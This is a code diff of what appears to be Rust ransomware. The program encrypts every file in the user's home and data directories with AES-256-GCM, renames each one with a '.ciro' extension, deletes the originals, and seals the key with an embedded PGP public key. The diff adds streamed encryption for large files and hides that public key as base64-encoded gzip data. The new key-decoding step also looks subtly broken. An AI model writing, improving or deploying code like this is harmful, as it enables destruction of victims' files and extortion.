@@ -1,6 +1,5 @@
 use aes_gcm::{
-    aead::{Aead, OsRng},
-    AeadCore, Aes256Gcm, KeyInit,
+    Aes256Gcm, KeyInit, aead::{AeadCore, OsRng, generic_array::GenericArray, stream::EncryptorBE32}
 };
 use dirs2::{data_dir, home_dir};
 use pgp::{
@@ -9,47 +8,51 @@ use pgp::{
 };
 use rayon::prelude::*;
 use std::{
-    fs::{read, read_dir, remove_file, File},
-    io::Write,
+    fs::{File, read_dir, remove_file},
+    io::{BufReader, Read, Write},
     path::PathBuf,
 };
 use zeroize::Zeroize;
+use flate2::read::GzDecoder;
+use base64::{Engine as _, engine::general_purpose};
 
-const PUB_KEY_STR: &str = r#"
------BEGIN PGP PUBLIC KEY BLOCK-----
+const PUB_KEY_ENCODED: &str = r#"H4sIAAAAAAAAA32ST4+iQBDF7/0pvBMDKCoe5tDdtNAgCChgc4PWaRH8P4jw6YdxL5vd7FZSSeVVUqn3yxsO+0LEpN7AN/2BH6ElxQOHsAFarrDzsx0CcDJcknmhYSFmOw1DCFpZ2OgIBjvo6hK/u/rM2vM2Tgq5lDJJiavyqn2S85WU5eglgMOLLuhaZUnSa25WDTd1EZwW535+5qdS+OaPPi9YsntkybzO1lrjlajhp7mSj7Qa5EkkFTYj5MUcaGgJDYKbLh35J+NT+aaO7LVRrpOvpHiJ7hxE+P0tpDlsIhtlqwwIGC1xICwoWIxFSXFDyUJQAwZ03/dWQOjg8LcjuYuhr9VCPvq3dKYDtXD512aNGFrMR5vdqbvcTexUT0ml51QondsQOJFni4ksSewW1fQSp7m6j57Vvar5RAFY9TbKBnWuWngKTLQVDC8qcTkRlzsShMB0F8MgekPVJx1tqcNqqt7Ddn7parUEwe7A8bS6tXgV8YQ/CreGDMPegrAKSyMm6tlg9k824E84BvwF5y/v2TTvvbf1qbo7K3n7UA/j7dLUQSSiw1hRwoks0iqNrCr0ckXz2is0JG/8nDt8pdVxVzuezY8ty5t2bG1nz1c4my5Uv1WAvQ0dEZQf4MMrrxy840U84z/Z+wZTTypjoQIAAA=="#;
 
-mDMEaNRDHBYJKwYBBAHaRw8BAQdAM8+crM87HecyVWi/k+a+0Vlkp4fEnpEkk2xg
-KcizQzy0LEZpbGlwcG8gQmFnbGlvbmkgPGZpbG9iYWdsaW9uaS4wNkBwcm90b24u
-bWU+iJYEExYKAD4WIQQq8+jcfYc6/q12JSDkSWtWixgznQUCaNRDHAIbAwUJBaOa
-gAULCQgHAgYVCgkICwIEFgIDAQIeAQIXgAAKCRDkSWtWixgznbMCAP4ug/jPqZ78
-1iMctTSBYBF92TdmzorGCKlv+1InZg0zMwEA5/7F5/++YqUuIoVZb1eUvlrluc50
-C1NT0TBzM1iN0AW4OARo1EMcEgorBgEEAZdVAQUBAQdA85zIyIKYuI1rRy9ozu1k
-QdhcC6lqyCOUcWcsiMuAYCADAQgHiH4EGBYKACYWIQQq8+jcfYc6/q12JSDkSWtW
-ixgznQUCaNRDHAIbDAUJBaOagAAKCRDkSWtWixgzna6bAP4yumlrKO/Xs1h3XLG8
-UgUh300R5/gZlZUHlRNb04NypAD+N3v9KcO4uVzuKNJcjyYbwy3HX7vxR76F1Py0
-JXRKgQk=
-=Nkpc
------END PGP PUBLIC KEY BLOCK-----
-"#;
-
-fn encrypt_file(file: PathBuf, cipher: Aes256Gcm) -> Result<(), std::io::Error> {
+fn encrypt_file(path: PathBuf, cipher: Aes256Gcm) -> Result<(), std::io::Error> {
     let nonce = Aes256Gcm::generate_nonce(&mut OsRng);
-    let content: Vec<u8> = read(&file)?;
-    let ciphertext: Vec<u8> = cipher
-        .encrypt(&nonce, content.as_ref())
-        .map_err(|_| std::io::Error::new(std::io::ErrorKind::Other, "Encryption error"))?;
+    let nonce_stream = GenericArray::from_slice(&nonce[0..8]); // Stream encryptor needs an 8-byte long nonce
+    let mut encryptor = EncryptorBE32::from_aead(cipher, nonce_stream);
 
-    // A new file with the encrypted content is created and the old one deleted
-    let mut new_path = file.clone();
+    let file = File::open(&path)?;
+    // Using a bufreader to avoid loading the entire file in memory
+    let mut reader = BufReader::new(file);
+    let mut buffer = vec![0; 4096];
+
+    let mut new_path = path.clone();
     if let Some(ext) = new_path.extension() {
         new_path.set_extension(format!("{}.ciro", ext.to_string_lossy()));
     } else {
         new_path.set_extension("ciro");
     }
     let mut new_file = File::create(new_path)?;
-    new_file.write_all(&nonce)?;
-    new_file.write_all(&ciphertext)?;
-    let _ = remove_file(file);
+    new_file.write_all(nonce_stream)?;
+
+    loop {
+        let bytes_read = reader.read(&mut buffer)?;
+        if bytes_read == 0 {
+            break;
+        }
+
+        let ciphertext = encryptor.encrypt_next(&buffer[0..bytes_read]).map_err(|_| std::io::Error::other("Encyption error"))?;
+
+        new_file.write_all(&ciphertext)?;
+    }
+
+    let ciphertext_last = encryptor.encrypt_last(b"".as_ref()).map_err(|_| std::io::Error::other("Last encryption error"))?;
+    new_file.write_all(&ciphertext_last)?;
+
+    let _ = remove_file(path);
+
     Ok(())
 }
 
@@ -84,8 +87,14 @@ fn main() {
     let cipher = Aes256Gcm::new(&key);
 
     // Create a recovery file inside data dir with the cipher key and nonce
+    let decoded_key = general_purpose::STANDARD.decode(PUB_KEY_ENCODED).expect("Could not decode public key");
+    let decoded_key_str = String::from_utf8(decoded_key).expect("Could not convert decoded public key to string");
+    let mut gz = GzDecoder::new(decoded_key_str.as_bytes());
+    let mut unzipped_key = String::new();
+    gz.read_to_string(&mut unzipped_key).expect("Could not unzip public key");
+    
     let (public_key, _) =
-        SignedPublicKey::from_string(PUB_KEY_STR).expect("Could not read public key");
+        SignedPublicKey::from_string(&unzipped_key).expect("Could not read public key");
 
     let mut msg =
         MessageBuilder::from_bytes("", key.to_vec()).seipd_v1(OsRng, SymmetricKeyAlgorithm::AES256);
